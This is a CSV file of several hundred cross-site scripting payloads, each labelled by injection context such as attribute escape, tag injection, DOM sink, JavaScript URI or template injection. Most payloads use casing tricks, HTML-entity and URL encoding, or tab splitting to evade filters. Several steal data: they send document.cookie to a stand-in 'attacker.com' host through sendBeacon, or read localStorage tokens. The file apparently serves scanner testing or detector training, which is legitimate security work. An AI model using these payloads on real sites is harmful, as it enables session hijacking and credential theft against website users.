payload,context
&quot; onpagehide=prompt(document.domain) x=&quot;,attribute_escape
""" %3E%3Csvg onpaste=confirm(String.fromCharCode(88,83,83))%3E",attribute_escape
"Object.assign(window,{""ontouchstart"":alert})",dom_sink
<scr	ipt>//prompt(document.domain)</scr	ipt>,script_injection
"__pRotO__[""oNenD""]=XMLHtTpREquEst(doCumEnt.coOkiE+'&loC='+loCatIon.hrEf)",dom_sink
<!--><blink onk&#101;ypr&#101;ss=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"\"" OnwHeeL=pRomPt('XSS')//",attribute_escape
onk&#101;ydown=confirm(loc&#97;tion.h&#97;sh),event_handler
"' ontouchst&#97;rt=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
' ontouchst&#97;rt=confirm('XSS') ',attribute_escape
""" ><svG oNwaItiNg=ProMpt(StRinG.fRomChaRCoDe(88,83,83))>",attribute_escape
"\"" onscrollsn&#97;pch&#97;ng&#101;=prompt(loc&#97;tion.h&#97;sh)//",attribute_escape
%22 onmouseover=console.log(location.hash) x=%22,attribute_escape
"<xmp ontouch&#101;nd=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
<!--><table onselect=confirm(document.domain)>,tag_injection
{{ confirm(%27XSS%27) }},template_injection
%3Cmath x=y oncopy=console.log(document.domain)%3E,tag_injection
' onwheel=prompt('XSS') ',attribute_escape
"&#101;l&#101;m&#101;nt.ins&#101;rtAdj&#97;c&#101;ntHTML(""b&#101;for&#101;&#101;nd"",""<img src=x on&#101;rror=&#97;l&#101;rt(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)>"")",dom_sink
<script>window['console.log']('XSS')</script>,script_injection
\' oncopy=console.log(location.hash)//,attribute_escape
<obJecT x=y OnaNimAtiOncAncEl=AleRt(DocUmeNt.DomAin)>,tag_injection
"__proto__[""onmouseenter""]=console.log(localStorage.getItem('token'))",dom_sink
JAVASCRIPT:alert(document.domain),js_uri
\%22 onend=alert(%27XSS%27)//,attribute_escape
%22 ongotpointercapture=console.log(document.domain) %22,attribute_escape
"<ifRamE oNgeStuReeNd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
"Object.assign(window,{%22onend%22:XMLHttpRequest})",dom_sink
"location.href=""javascript:prompt(navigator.sendBeacon('//attacker.com',document.cookie))""",dom_sink
"\"" OncOpy=coNsoLe.Log('XSS')//",attribute_escape
""" oNcoPy=ProMpt(doCumEnt.doMaiN) """,attribute_escape
"'><img src=x onvolumechange=\u0061lert(String.fromCharCode(88,83,83))>",attribute_escape
"Object.assign(window,{""ongotpointercapture"":\u0061lert})",dom_sink
<auDio onMouSeoVer=coNsoLe.Log('XSS')>,tag_injection
`><Img srC=x onWebKitAniMatIonEnd=coNsoLe.Log(doCumEnt.doMaiN)>,attribute_escape
&quOt; onPopStaTe=AleRt(LocAtiOn.HasH) X=&QuoT;,attribute_escape
""" ><svG oNenDed=prOmpT('XSS')>",attribute_escape
"__proto__[""ontouchmove""]=eval(localStorage.getItem('token'))",dom_sink
"\"" ongestureend=console.log(location.hash)//",attribute_escape
"location=""javascript:fetch(navigator.sendBeacon('//attacker.com',document.cookie))""",dom_sink
`><img src=x onwh&#101;&#101;l=consol&#101;.log(loc&#97;tion.h&#97;sh)>,attribute_escape
"' oNtrAnsItiOnrUn=AleRt(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
"""><img src=x oncut=prompt(String.fromCharCode(88,83,83))>",attribute_escape
"s&#101;tInt&#101;rv&#97;l(""confirm(loc&#97;tion.h&#97;sh)"",100)",dom_sink
{{{prompt(docum&#101;nt.cooki&#101;)}}},template_injection
\' OnsEarCh=ProMpt(loCatIon.haSh)//,attribute_escape
<!--><TabLe OnsEleCt=ConFirM(dOcuMenT.dOmaIn)>,tag_injection
\%22 onscrollsnapchange=alert(1)//,attribute_escape
"<script
>consol&#101;.log('XSS')</script>",script_injection
""" onb&#101;for&#101;toggl&#101;=consol&#101;.log('XSS') """,attribute_escape
`><img src=x onpagereveal=console.log(1)>,attribute_escape
' ><svg onselect=confirm(location.hash)>,attribute_escape
%3C!--%3E%3Ctemplate onsearch=console.log(document.domain)%3E,tag_injection
""" ><svg onbeforetoggle=alert(location.hash)>",attribute_escape
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=f&#101;tch(docum&#101;nt.cooki&#101;)>"")",dom_sink
<tr	onanimationend=prompt(%27XSS%27)>,tag_injection
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=&#101;v&#97;l(bto&#97;(docum&#101;nt.cooki&#101;))>""",dom_sink
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""prompt(1)"")",dom_sink
\%22 onbegin=console.log(location.hash)//,attribute_escape
'><img src=x ongestureend=alert(1)>,attribute_escape
"OnbEfoRecOpy=alErt&#40;STriNg.FroMChArCOde(88,83,83)&#41;",event_handler
"__proto__[""ontoggle""]=XMLHttpRequest(location.hash)",dom_sink
""" %3E%3Csvg ongestureend=prompt(1)%3E",attribute_escape
"Object.assign(window,{%22ondragstart%22:fetch})",dom_sink
"""%3E%3Csource onvolumechange=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
"<obJecT
oNweBkiTanImaTioNenD=aLerT(lOcaTioN.hAsh)>",tag_injection
"loc&#97;tion=""j&#97;v&#97;script:consol&#101;.log(bto&#97;(docum&#101;nt.cooki&#101;))""",dom_sink
' ontouch&#101;nd=consol&#101;.log('XSS') ',attribute_escape
ondrop=alert&#40;document.domain&#41;,event_handler
' ><svG oNfoCusOut=alErt(loCatIon.haSh)>,attribute_escape
__${\u0061lert(document.cookie)}__::.x,template_injection
"`><img src=x onreset=console.log(String.fromCharCode(88,83,83))>",attribute_escape
"""><img src=x ontr&#97;nsitionrun=consol&#101;.log('XSS')>",attribute_escape
"<!--><animatetransform ondragover=console.log(String.fromCharCode(88,83,83))>",tag_injection
"""%3E%3Canimatemotion ondblclick=console.log(1)%3E",tag_injection
OnpLayIng=jaVasCriPt:ConSolE.lOg(1),event_handler
"`><img src=x onpause=console.log(String.fromCharCode(88,83,83))>",attribute_escape
j&#97;v&#97;script:%0&#97;prompt(docum&#101;nt.dom&#97;in),js_uri
"\%22 onkeypress=console.log(String.fromCharCode(88,83,83))//",attribute_escape
"__pRotO__[""oNdrAgoVer""]=ProMpt('XSS')",dom_sink
' onfocusout=alert(location.hash) ',attribute_escape
"""><script>alert(String.fromCharCode(88,83,83))</script>",script_injection
""" oNinValId=AleRt(DocUmeNt.DomAin) """,attribute_escape
' ><svG oNtrAnsItiOneNd=AleRt(DocUmeNt.DomAin)>,attribute_escape
onfocus=&#97;l&#101;rt&#40;loc&#97;tion.h&#97;sh&#41;,event_handler
"<m&#101;t&#97; onh&#97;shch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""%3E%3Cimg src=x onpromptdismiss=alert('XSS')%3E",attribute_escape
"' onbeforepaste=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
\' onfocus=consol&#101;.log(1)//,attribute_escape
"&quOt; onPoiNteRovEr=ConFirM(STriNg.FroMChArCOde(88,83,83)) X=&QuoT;",attribute_escape
"\"" oncut=confirm(1)//",attribute_escape
%27 ><svg onblur=console.log(document.domain)>,attribute_escape
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=f&#101;tch(1)>""",dom_sink
&quOt; onFocUsiN=pRomPt(1) X=&QuoT;,attribute_escape
%27 ><svg onpointerdown=console.log(document.domain)>,attribute_escape
<arEa X=y onLoaD=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection
OneRroR=cOnsOle.loG/*X*/('XSS'),event_handler
"document.body.innerHTML=""%3Cimg src=x onerror=confirm(btoa(document.cookie))%3E""",dom_sink
\' OnaUxcLicK=pRomPt(LocAtiOn.HasH)//,attribute_escape
onrepeat=alert('XSS'),event_handler
<maTh/OnpLayIng=coNsoLe.Log('XSS')>,tag_injection
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=cOnfIrm('XSS')>""",dom_sink
' ><svg onbeforepaste=\u0061lert(1)>,attribute_escape
[#prompt document.domain /],template_injection
'%3E%3Cimg src=x onended=prompt('XSS')%3E,attribute_escape
javascr	ipt:prompt(document.domain),js_uri
"%3Cscript%3EFunction('prompt(String.fromCharCode(88,83,83))')();%3C/script%3E",script_injection
"&quot; onmous&#101;&#101;nt&#101;r=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape
"Object.assign(window,{""onpointerdown"":\u0061lert})",dom_sink
%3Cscript%3Econsole.log(location.hash)%3C/script%3E,script_injection
javascr	ipt:alert/***/(location.hash),js_uri
"EleMenT.iNseRtADjaCenTHTML(""beForEenD"",""<iMg Src=x OneRroR=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83))>"")",dom_sink
<area onpointercancel=console.log(document.domain)>,tag_injection
"""><script>confirm(document.domain)</script>",script_injection
"""><MarQueE oNbeForEtoGglE=aLerT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
"element.setAttribute(""onclick"",""XMLHttpRequest(navigator.sendBeacon('//attacker.com',document.cookie))"")",dom_sink
"\%22 onrepeat=confirm(String.fromCharCode(88,83,83))//",attribute_escape
\%27 onmouseenter=alert(document.domain)//,attribute_escape
"OnpAgeHidE=jAvaScrIpt:coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83))",event_handler
"%3C!--%3E%3Cmarquee onpromptdismiss=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
"""><Img srC=x onScrOllSnaPchAngE=aLerT(1)>",attribute_escape
"\"" ontransitionstart=confirm(String.fromCharCode(88,83,83))//",attribute_escape
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=consol&#101;.log(docum&#101;nt.dom&#97;in)>""",dom_sink
"&#101;v&#97;l(""&#97;l&#101;rt('XSS')"")",dom_sink
%3Cscript%3Eprompt(1)%3C/script%3E,script_injection
"\"" ontouchend=prompt('XSS')//",attribute_escape
[#prompt docum&#101;nt.cooki&#101; /],template_injection
\' onp&#97;g&#101;r&#101;v&#101;&#97;l=confirm(docum&#101;nt.dom&#97;in)//,attribute_escape
"""><img src=x onscrollsnapchange=confirm('XSS')>",attribute_escape
document.write(%22<img src=x onerror=confirm(location.hash)>%22),dom_sink
<anImaTe X=y onPagEshOw=ConSolE.lOg('XSS')>,tag_injection
"<blInk
onPopStaTe=ConSolE.lOg(DocUmeNt.DomAin)>",tag_injection
"\%22 onvolumechange=prompt(String.fromCharCode(88,83,83))//",attribute_escape
"document.querySelector(""body"").innerHTML+=""eval(navigator.sendBeacon('//attacker.com',document.cookie))""",dom_sink
"%3Cscript%3EsetTimeout('confirm(1)',0)%3C/script%3E",script_injection
"%3Ciframe x=y ontouchstart=prompt(String.fromCharCode(88,83,83))%3E",tag_injection
\' OnaNimAtiOncAncEl=ProMpt(loCatIon.haSh)//,attribute_escape
' ><svg onmousewheel=alert(document.domain)>,attribute_escape
""" %3E%3Csvg ongestureend=prompt(document.domain)%3E",attribute_escape
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=console.log('//attacker.com/?c='+document.cookie)>"")",dom_sink
"setInterval(""prompt(document.domain)"",100)",dom_sink
"\"" OnaNimAtiOniTerAtiOn=ConSolE.lOg('XSS')//",attribute_escape
"ObjEct.asSigN(wIndOw,{""oNbeForEtoGglE"":ProMpt})",dom_sink
<diV oNpaUse=coNfiRm(LocAtiOn.HasH) OnpAusE=cOnfIrm(loCatIon.haSh)>,tag_injection
__proto__[%22onend%22]=XMLHttpRequest(document.domain),dom_sink
"""><img src=x onpoint&#101;rc&#97;nc&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in)>",attribute_escape
&quot; ontransitionend=confirm('XSS') x=&quot;,attribute_escape
%27 ><svg ongestureend=console.log(%27XSS%27)>,attribute_escape
"<scRipT>cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))</scRipT>",script_injection
"&#101;v&#97;l(""XMLHttpR&#101;qu&#101;st(docum&#101;nt.cooki&#101;+'&loc='+loc&#97;tion.hr&#101;f)"")",dom_sink
""" onp&#97;g&#101;r&#101;v&#101;&#97;l=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape
%22><img src=x onmouseover=prompt(1)>,attribute_escape
"""><img src=x onblur=\u0061lert(location.hash)>",attribute_escape
"OnmOusEwhEel=prOmpT(STriNg.FroMChArCOde(88,83,83))",event_handler
' ><svg on&#97;uxclick=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape
OnmOusEup=coNsoLe.Log/***/('XSS'),event_handler
"%27 onbeforematch=prompt(String.fromCharCode(88,83,83)) %27",attribute_escape
"<img
onwebkitfullscreenchange=alert('XSS')>",tag_injection
<span/onsecuritypolicyviolation=\u0061lert(location.hash)>,tag_injection
'%3E%3Cimg src=x onauxclick=prompt(location.hash)%3E,attribute_escape
""" ><svg onsearch=confirm(1)>",attribute_escape
%27><img src=x onanimationend=confirm(location.hash)>,attribute_escape
`><img src=x onpopstate=alert('XSS')>,attribute_escape
""" ><svG oNcoPy=ConSolE.lOg(LocAtiOn.HasH)>",attribute_escape
`><img src=x onpoint&#101;rup=prompt(loc&#97;tion.h&#97;sh)>,attribute_escape
"setTimeout(%22confirm(document.cookie)%22,0)",dom_sink
"LocAtiOn.HreF=""JavAscRipT:pRomPt(DocUmeNt.CooKie+'&Loc='+LocAtiOn.HreF)""",dom_sink
%3Cform onpagereveal=console.log(location.hash)/%3E,tag_injection
"<form onwebkitfullscreenchange=console.log(String.fromCharCode(88,83,83))>",tag_injection
\' OnpAusE=cOnfIrm(doCumEnt.doMaiN)//,attribute_escape
onrepeat=alert(%27XSS%27),event_handler
""" ><svg onmozfullscreenchange=\u0061lert(1)>",attribute_escape
' oNmoUseUp=ConSolE.lOg('XSS') ',attribute_escape
%3Cscript%3E//console.log(document.domain)%3C/script%3E,script_injection
'><Img srC=x onInvAliD=pRomPt(1)>,attribute_escape
`><img src=x oninv&#97;lid=prompt(1)>,attribute_escape
"<script	>confirm(String.fromCharCode(88,83,83))</script>",script_injection
"\"" onpagereveal=console.log(document.domain)//",attribute_escape
%3C%= alert(1) %%3E,template_injection
	onchange=confirm(location.hash),event_handler
\' onreset=\u0061lert('XSS')//,attribute_escape
<video	ondragstart=alert('XSS')>,tag_injection
\' onselect=confirm(location.hash)//,attribute_escape
"\"" OniNpuT=cOnsOle.loG(dOcuMenT.dOmaIn)//",attribute_escape
""" oNdrOp=ConFirM(lOcaTioN.hAsh) """,attribute_escape
" on&#97;nim&#97;tionc&#97;nc&#101;l=confirm(String.fromCh&#97;rCod&#101;(88,83,83))",event_handler
' ><svg ontouchend=alert('XSS')>,attribute_escape
%22><img src=x onplay=confirm(%27XSS%27)>,attribute_escape
"%27 ontransitionrun=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
<listing	onwebkitanimationend=console.log('XSS')>,tag_injection
"<script>/*/prompt(String.fromCharCode(88,83,83))</script>",script_injection
""" ><svg onsearch=prompt(location.hash)>",attribute_escape
"\"" OnpLayIng=coNfiRm(StrIng.frOmCHarCodE(88,83,83))//",attribute_escape
%3Cobject x=y onanimationcancel=alert(document.domain)%3E,tag_injection
onpagehide=prompt/***/(document.domain),event_handler
"<boDy
OngEstUreStaRt=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))>",tag_injection
' ><svG oNpaGehIde=coNsoLe.Log(doCumEnt.doMaiN)>,attribute_escape
{{pRomPt(DocUmeNt.DomAin)}},template_injection
"\"" onb&#101;gin=consol&#101;.log(loc&#97;tion.h&#97;sh)//",attribute_escape
	onk&#101;ypr&#101;ss=prompt(docum&#101;nt.dom&#97;in),event_handler
%3Cvideo src=x onmozfullscreenchange=prompt('XSS')%3E,tag_injection
"<arEa
OnpAgeShoW=pRomPt('XSS')>",tag_injection
"""><img src=x onpagereveal=console.log(1)>",attribute_escape
""" oNbeForEinPut=coNsoLe.Log(doCumEnt.doMaiN) """,attribute_escape
&quOt; onEndEd=ProMpt('XSS') x=&qUot;,attribute_escape
<b&#97;s&#101; x=y onpoint&#101;rup=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
"setTimeout(%22alert(document.domain)%22,0)",dom_sink
%22><area onpointercancel=console.log(document.domain)>,tag_injection
"""><img src=x on&#97;nim&#97;tion&#101;nd=confirm(loc&#97;tion.h&#97;sh)>",attribute_escape
" onPoiNteRovEr=ProMpt(StRinG.fRomChaRCoDe(88,83,83))",event_handler
	onrepeat=alert(%27XSS%27),event_handler
\%27 onmouseenter=alert(location.hash)//,attribute_escape
&quOt; onWheEl=ConSolE.lOg(DocUmeNt.DomAin) x=&qUot;,attribute_escape
\%27 onload=console.log(1)//,attribute_escape
<scRipT>/X/pRomPt('XSS')</sCriPt>,script_injection
<script>prompt(docum&#101;nt.dom&#97;in)</script>,script_injection
"%22><img src=x onanimationcancel=console.log(String.fromCharCode(88,83,83))>",attribute_escape
<noScrIpt x=Y oNpaSte=coNfiRm(LocAtiOn.HasH)>,tag_injection
' ><svg on&#101;rror=consol&#101;.log(docum&#101;nt.dom&#97;in)>,attribute_escape
 onpointermove=\u0061lert(document.domain),event_handler
onhashchange=javascript:alert(%27XSS%27),event_handler
java	script:prompt(document.domain),js_uri
"element.setAttribute(%22onclick%22,%22XMLHttpRequest(location.hash)%22)",dom_sink
""" ontoggl&#101;=consol&#101;.log(1) """,attribute_escape
"document.write(""%3Cimg src=x onerror=confirm(localStorage.getItem('token'))%3E"")",dom_sink
\' ondrop=alert('XSS')//,attribute_escape
"""><&#97;r&#101;&#97; onclos&#101;=prompt(1)>",tag_injection
"(new Function(""\u0061lert('//attacker.com/?c='+document.cookie)""))();",dom_sink
\%22 onmousedown=console.log(%27XSS%27)//,attribute_escape
"%27 onscrollsnapchange=prompt(String.fromCharCode(88,83,83)) %27",attribute_escape
"\"" ondragstart=console.log(document.domain)//",attribute_escape
<!--><textarea onscrollend=alert(%27XSS%27)>,tag_injection
%27 oninvalid=alert(document.domain) %27,attribute_escape
on&#101;nd=prompt(loc&#97;tion.h&#97;sh),event_handler
"%22 onanimationiteration=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape
"Object.assign(window,{%22onwaiting%22:confirm})",dom_sink
"setTimeout(""console.log(localStorage.getItem('token'))"",0)",dom_sink
"\"" OnpAgeShoW=cOnfIrm(doCumEnt.doMaiN)//",attribute_escape
""" %3E%3Csvg onended=prompt(document.domain)%3E",attribute_escape
"%3Cscript%3EFunction('confirm(String.fromCharCode(88,83,83))')();%3C/script%3E",script_injection
"\"" onfocus=console.log(1)//",attribute_escape
""" ><svg onwebkitfullscreenchange=\u0061lert('XSS')>",attribute_escape
<svG oNbeForEcoPy=ProMpt(doCumEnt.doMaiN)/>,tag_injection
"<blink
onp&#97;g&#101;hid&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"location.href=""javascr	ipt:XMLHttpRequest(document.cookie)""",dom_sink
"__pRotO__[""oNseCurItyPolIcyVioLatIon""]=AleRt(NavIgaTor.seNdBEacOn('//AttAckEr.Com',dOcuMenT.cOokIe))",dom_sink
"ObjEct.asSigN(wIndOw,{""oNcuT"":ConFirM})",dom_sink
<a x=y onsearch=alert(1)>,tag_injection
' ><svg onpageswap=\u0061lert(document.domain)>,attribute_escape
%22 ><svg ongesturestart=prompt(%27XSS%27)>,attribute_escape
""" ><svG oNbeForEcuT=aLerT(dOcuMenT.dOmaIn)>",attribute_escape
"%3Cobject
ontouchstart=console.log(location.hash)%3E",tag_injection
<liNk OniNpuT=aLerT(dOcuMenT.dOmaIn)>,tag_injection
' ontransitionrun=console.log('XSS') ',attribute_escape
\' onp&#97;g&#101;hid&#101;=prompt(docum&#101;nt.dom&#97;in)//,attribute_escape
"%27 ><svg onended=confirm(String.fromCharCode(88,83,83))>",attribute_escape
__proto__[%22onclose%22]=confirm(location.hash),dom_sink
"%27><img src=x onload=alert(String.fromCharCode(88,83,83))>",attribute_escape
 onwebkitfullscreenchange=prompt(%27XSS%27),event_handler
"<xmp onmous&#101;wh&#101;&#101;l=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) onmous&#101;wh&#101;&#101;l=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<marquee	onpopstate=alert(%27XSS%27)>,tag_injection
"element.insertAdjacentHTML(""beforeend"",""<img src=x onerror=confirm(String.fromCharCode(88,83,83))>"")",dom_sink
<!--><DiaLog onPlaY=pRomPt(DocUmeNt.DomAin)>,tag_injection
&quot; ontransitionrun=console.log('XSS') x=&quot;,attribute_escape
"""><audio onplay=console.log(1)>",tag_injection
"\"" onwh&#101;&#101;l=consol&#101;.log(docum&#101;nt.dom&#97;in)//",attribute_escape
"javascript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=console.log(document.domain) )//%0D%0A%0d%0a",js_uri
\' onst&#97;ll&#101;d=prompt(1)//,attribute_escape
"\"" onsearch=prompt(document.domain)//",attribute_escape
"""><img src=x on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
<title x=y onmozfullscreenchange=prompt('XSS')>,tag_injection
location=%22javascript:fetch(localStorage.getItem(%27token%27))%22,dom_sink
<scr	ipt>/x/prompt(1)</scr	ipt>,script_injection
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=alert(btoa(document.cookie))%3E"")",dom_sink
'%3E%3Cimg src=x onbegin=console.log(location.hash)%3E,attribute_escape
[#prompt 'XSS' /],template_injection
' ><svg onr&#101;s&#101;t=&#97;l&#101;rt('XSS')>,attribute_escape
\%27 onmousedown=confirm(document.domain)//,attribute_escape
<seT oNclOse=coNfiRm(DocUmeNt.DomAin)/>,tag_injection
<m&#101;t&#97; ons&#101;curitypolicyviol&#97;tion=prompt('XSS') ons&#101;curitypolicyviol&#97;tion=prompt('XSS')>,tag_injection
""" onmouseover=confirm(1) x=""",attribute_escape
<base src=x onbeforecopy=console.log(location.hash)>,tag_injection
OnmOusEenTer=jaVasCriPt:ConFirM(lOcaTioN.hAsh),event_handler
"<xmp src=x onfocusout=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
""" %3E%3Csvg ondblclick=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
javascr	ipt:%0aalert(location.hash),js_uri
<animatemotion/onwaiting=\u0061lert(location.hash)>,tag_injection
"javascr	ipt:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=prompt(document.domain) )//%0D%0A%0d%0a",js_uri
OndRagEntEr=JavAscRipT:pRomPt(DocUmeNt.DomAin),event_handler
\' ontouchmov&#101;=consol&#101;.log('XSS')//,attribute_escape
<arEa OnlOad=coNsoLe.Log(doCumEnt.doMaiN)/>,tag_injection
